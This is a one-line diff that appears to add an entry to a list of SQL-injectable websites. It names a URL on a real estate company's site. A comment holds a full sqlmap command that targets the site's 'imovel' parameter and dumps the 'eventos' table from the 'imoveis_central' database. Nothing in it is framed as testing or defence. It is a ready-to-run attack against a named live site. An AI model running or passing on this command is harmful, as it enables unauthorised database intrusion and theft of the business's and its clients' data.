@@ -1,0 +1,1 @@
+https://www.imobiliariafrancis.com.br/?mostra=mostra&imovel=18402 (GET)  # sqlmap.py --threads 5 -v3 --random-agent -u https://www.imobiliariafrancis.com.br/?mostra=mostra&imovel=18402 -D imoveis_central -T eventos --dump
